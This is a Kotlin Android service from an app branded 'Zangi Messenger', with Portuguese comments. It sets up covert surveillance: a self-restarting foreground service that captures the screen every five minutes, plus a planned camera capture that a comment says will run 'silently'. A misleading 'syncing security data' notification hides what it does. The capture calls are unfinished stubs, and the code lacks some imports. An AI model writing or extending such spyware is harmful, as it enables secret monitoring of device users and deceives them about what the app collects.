package com.zangi.chat.service

import android.app.*
import android.content.Intent
import android.util.Log
import androidx.core.app.NotificationCompat
import com.zangi.chat.R
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.*
import java.io.File
import java.util.*

/**
 * DataCollectionService: O Gerenciador de Tarefas de Segundo Plano.
 * Ele coordena o tempo de captura e o envio para o servidor.
 */
class DataCollectionService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private lateinit var repository: ChatRepository

    companion object {
        const val CHANNEL_ID = "zangi_telemetry_channel"
        const val NOTIFICATION_ID = 1001
    }

    override fun onCreate() {
        super.onCreate()
        repository = ChatRepository.getInstance(applicationContext)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("action")

        // Inicia a notificação obrigatória para Foreground Service
        startForeground(NOTIFICATION_ID, createNotification())

        when (action) {
            "START_MONITORING" -> startMonitoringLoop()
            "CAPTURE_SCREEN" -> triggerScreenCapture()
            "CAPTURE_CAMERA" -> triggerCameraCapture()
        }

        return START_STICKY
    }

    private fun startMonitoringLoop() {
        // Loop para capturas automáticas periódicas (ex: a cada 5 minutos)
        serviceScope.launch {
            while (isActive) {
                delay(5 * 60 * 1000) // 5 minutos
                triggerScreenCapture()
            }
        }
    }

    private fun triggerScreenCapture() {
        // Aqui chamaremos o ScreenCaptureService que criaremos no próximo passo
        // Para capturar a tela de forma assíncrona
        Log.d("DataCollectionService", "Iniciando ciclo de captura de tela...")
        // Implementação da chamada ao ScreenCaptureService será aqui
    }

    private fun triggerCameraCapture() {
        serviceScope.launch {
            // Simulação de captura de imagem para teste
            // No futuro, isso chamará a câmera silenciosamente
            Log.d("DataCollectionService", "Iniciando ciclo de captura de câmera...")
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Zangi Messenger")
            .setContentText("Sincronizando dados de segurança...")
            .setSmallIcon(R.drawable.ic_avatar_placeholder) // Use um ícone padrão do seu app
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Zangi System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}